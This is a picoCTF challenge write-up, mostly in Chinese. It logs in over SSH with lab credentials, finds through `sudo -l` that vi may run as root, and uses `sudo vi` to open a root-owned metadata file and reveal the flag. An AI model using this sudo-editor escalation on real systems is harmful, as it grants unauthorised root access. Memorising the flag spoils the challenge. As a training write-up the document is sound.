# Description
Can you read files in the root file? The system admin has provisioned an account for you on the main server: ssh -p 60683 picoplayer@saturn.picoctf.net Password: yX-YQgX-vS Can you login and read the root file?

# 解題
先使用 `ssh` 連線
```bash
ssh -p 60683 picoplayer@saturn.picoctf.net
```
接著使用 `sudo -l` 查看目前這個 user 有權執行的命令
```bash
picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
```
發現可以對 `challenge` 使用 `/usr/bin/vi`，先 `cd` 前往根目錄，並 `ls` 列出所有檔案
```bash
picoplayer@challenge:~$ cd /
picoplayer@challenge:/$ ls 
bin   challenge  etc   lib    lib64   media  opt   root  sbin  sys  usr
boot  dev        home  lib32  libx32  mnt    proc  run   srv   tmp  var
```
發現 `challenge`，執行
```bash
sudo /usr/bin/vi challenge/
```
看到以下內容
```text
" ============================================================================
" Netrw Directory Listing                                        (netrw v165)
"   /challenge
"   Sorted by      name
"   Sort sequence: [\/]$,\<core\%(\.\d\+\)\=\>,\.h$,\.c$,\.cpp$,\~\=\*$,*,\.o$,\
"   Quick Help: <F1>:help  -:go up dir  D:delete  R:rename  s:sort-by  x:special
" ==============================================================================
../                                                                             
./
metadata.json
```
發現其下有 `metadata.json` ，再次執行
```bash
sudo /usr/bin/vi challenge/metadata.json
```
得到 flag
```text
{"flag": "picoCTF{uS1ng_v1m_3dit0r_55878b51}", "username": "picoplayer", "password": "yX-YQgX-vS"}

```




<!-- flag -->
所以本題 FLAG 
```text
picoCTF{uS1ng_v1m_3dit0r_55878b51}
```
